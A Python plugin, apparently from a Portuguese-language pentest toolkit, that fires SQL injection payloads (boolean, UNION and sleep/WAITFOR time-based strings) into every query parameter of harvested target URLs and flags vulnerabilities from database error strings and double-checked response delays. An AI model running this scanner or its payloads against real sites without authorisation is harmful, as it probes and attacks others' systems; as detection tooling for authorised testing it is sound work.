import json
import logging
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse
from menu import C
from plugins.output import info, error, success, warn
from plugins.http_utils import format_http_request, format_http_response

logging.getLogger("httpx").setLevel(logging.WARNING)

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1\"",
    "1' ORDER BY 1--+",
    "1' UNION SELECT NULL--+",
    "' OR sleep(8)='",
    "1 AND (SELECT * FROM (SELECT(SLEEP(8)))a)",
    "' WAITFOR DELAY '0:0:8'--",
]

# Payloads de confirmação para double-check time-based (sleep diferente)
SQLI_CONFIRM_PAYLOADS = {
    "' OR sleep(8)='": "' OR sleep(4)='",
    "1 AND (SELECT * FROM (SELECT(SLEEP(8)))a)": "1 AND (SELECT * FROM (SELECT(SLEEP(4)))a)",
    "' WAITFOR DELAY '0:0:8'--": "' WAITFOR DELAY '0:0:4'--",
}

SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "pdoexception",
    "postgresql query failed",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "ora-01756",
    "ora-00933",
    "sqlite3.operationalerror",
    "syntax error in string in query expression",
    "pg::syntaxerror:",
]

def scan_sqli(url: str) -> list[dict]:
    """Thread-safe: cada thread cria seu próprio httpx.Client."""
    import httpx
    from core.config import get_user_agent

    findings = []
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qsl(parsed.query)
        if not params:
            return findings

        with httpx.Client(verify=False, timeout=15) as client:
            ua = get_user_agent()

            # V10.6: Baseline check
            baseline_errors = set()
            baseline_time = 0
            try:
                baseline_resp = client.get(url, headers={"User-Agent": ua}, timeout=15)
                baseline_time = baseline_resp.elapsed.total_seconds()
                baseline_body = baseline_resp.text.lower()
                for err in SQLI_ERRORS:
                    if err in baseline_body:
                        baseline_errors.add(err)
            except Exception:
                pass

            # Test payloads
            for key, value in params:
                for payload in SQLI_PAYLOADS:
                    test_params = []
                    for k, v in params:
                        if k == key:
                            val = v.replace("FUZZ", "") if "FUZZ" in v else v
                            test_params.append((k, val + payload))
                        else:
                            test_params.append((k, v))

                    test_query = urllib.parse.urlencode(test_params)
                    test_url = parsed._replace(query=test_query).geturl()

                    try:
                        resp = client.get(test_url, headers={"User-Agent": ua}, timeout=12)
                        test_time = resp.elapsed.total_seconds()
                        body = resp.text.lower()

                        found = False
                        # Check Error-based
                        for err in SQLI_ERRORS:
                            if err in body and err not in baseline_errors:
                                findings.append({
                                    "url": test_url,
                                    "type": "SQL_INJECTION",
                                    "risk": "CRITICAL",
                                    "details": f"SQLi Confirmado via {key} (Error-based: {err})",
                                    "payload": payload,
                                    "request_raw": format_http_request(resp.request),
                                    "response_raw": format_http_response(resp),
                                })
                                found = True
                                break

                        # Check Time-based com DOUBLE-CHECK
                        if not found and ("sleep" in payload.lower() or "waitfor delay" in payload.lower()):
                            if test_time > 7 and baseline_time < 3:
                                # DOUBLE-CHECK: Confirmar com sleep(4) — deve demorar ~4s
                                confirm_payload = SQLI_CONFIRM_PAYLOADS.get(payload)
                                if confirm_payload:
                                    confirm_params = []
                                    for k, v in params:
                                        if k == key:
                                            val = v.replace("FUZZ", "") if "FUZZ" in v else v
                                            confirm_params.append((k, val + confirm_payload))
                                        else:
                                            confirm_params.append((k, v))

                                    confirm_query = urllib.parse.urlencode(confirm_params)
                                    confirm_url = parsed._replace(query=confirm_query).geturl()

                                    try:
                                        confirm_resp = client.get(confirm_url, headers={"User-Agent": ua}, timeout=12)
                                        confirm_time = confirm_resp.elapsed.total_seconds()

                                        # Confirmar: sleep(4) deve demorar entre 3.5 e 6s
                                        if 3.5 < confirm_time < 6.0:
                                            findings.append({
                                                "url": test_url,
                                                "type": "SQL_INJECTION",
                                                "risk": "CRITICAL",
                                                "details": (
                                                    f"SQLi Confirmado via {key} (Time-based double-check: "
                                                    f"sleep(8)={test_time:.2f}s, sleep(4)={confirm_time:.2f}s, "
                                                    f"baseline={baseline_time:.2f}s)"
                                                ),
                                                "payload": payload,
                                                "request_raw": format_http_request(resp.request),
                                                "response_raw": format_http_response(resp),
                                            })
                                    except Exception:
                                        pass

                    except Exception:
                        # V11: NÃO reportar timeouts como SQLi — alta taxa de FP
                        pass
    except Exception:
        pass
    return findings

def run(context: dict) -> list[str]:
    target = context.get("target")
    if not target:
        raise ValueError("Target required")
    print(f"\n{C.BOLD}{C.CYAN}▰▰▰ INJETANDO SQL (SQLi) ▰▰▰{C.END}\n")

    outdir = Path("output") / target / "sqli"
    outdir.mkdir(parents=True, exist_ok=True)
    results_file = outdir / "sqli_results.json"

    try:
        import httpx
    except ImportError:
        error("httpx não encontrado")
        return []

    all_findings = []
    urls_file = Path("output") / target / "urls" / "patterns" / "sqli_ready.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "urls" / "urls_200.txt"
        if not urls_file.exists():
            warn("Nenhuma URL com parâmetros encontrada para teste de SQLi.")
            return [str(results_file)]

    urls = list(set([u.strip() for u in urls_file.read_text().splitlines() if u.strip()]))
    info(f"   📊 Testando {len(urls)} URLs para SQL Injection...")

    # V11: Thread-safe — cada thread cria seu próprio client
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(scan_sqli, url): url for url in urls[:100]}
        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    all_findings.extend(result)
                    for f in result:
                        info(f"   🚨 {C.RED}SQLi Encontrado: {f['url']}{C.END}")
            except Exception:
                pass

    results_file.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False))
    if all_findings:
        success(f"💉 {len(all_findings)} potenciais vulnerabilidades de SQLi encontradas!")
    else:
        success("✅ Nenhuma vulnerabilidade SQLi detectada.")

    return [str(results_file)]
